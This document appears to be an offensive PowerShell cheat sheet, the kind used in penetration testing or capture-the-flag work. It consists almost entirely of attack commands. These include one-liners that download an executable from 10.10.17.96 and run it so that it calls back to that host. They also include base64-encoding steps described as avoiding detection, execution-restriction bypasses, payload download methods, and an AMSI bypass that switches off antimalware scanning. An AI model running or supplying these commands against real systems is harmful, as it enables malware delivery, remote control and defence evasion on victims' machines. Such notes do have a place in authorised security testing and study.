# PowerShell Techniques

---

## Command Encoding and Execution

### Base64 Encoding for PowerShell Commands
```powershell
# Native PowerShell method to encode commands (avoids detection and special character issues)
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("mkdir c:\whirley; iwr -uri http://10.10.17.96/client_x64.exe -outfile c:\whirley\client.exe; c:\whirley\client.exe -d 10.10.17.96"))
```

### Using Helper Script for Encoding
```bash
# Linux helper script to encode PowerShell commands
powershell_encode 'mkdir c:\whirley; iwr -uri http://10.10.17.96/client_x64.exe -outfile c:\whirley\client.exe; c:\whirley\client.exe -d 10.10.17.96'
```

---

## Execution Bypasses

### Pipe to No-Profile PowerShell
```powershell
# Bypass execution restrictions by piping commands to PowerShell with noprofile
echo mkdir c:\whirley; iwr -uri http://10.10.17.96/client_x64.exe -outfile c:\whirley\client.exe; c:\whirley\client.exe -d 10.10.17.96 | powershell -noprofile -
```

### Executing Encoded Commands
```powershell
# Execute a Base64 encoded command (combine with encoding techniques above)
powershell -EncodedCommand <BASE64_STRING>
```

---

## PowerShell Download Techniques

### Invoke-WebRequest (PowerShell 3.0+)
```powershell
# Download a file using Invoke-WebRequest (alias: iwr, wget)
Invoke-WebRequest -Uri "http://10.10.17.96/payload.exe" -OutFile "C:\Windows\Temp\payload.exe"
```

### System.Net.WebClient
```powershell
# Alternative download method for older PowerShell versions
(New-Object System.Net.WebClient).DownloadFile("http://10.10.17.96/payload.exe", "C:\Windows\Temp\payload.exe")
```

---

## AMSI Bypass Examples

```powershell
# Simple AMSI bypass technique
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
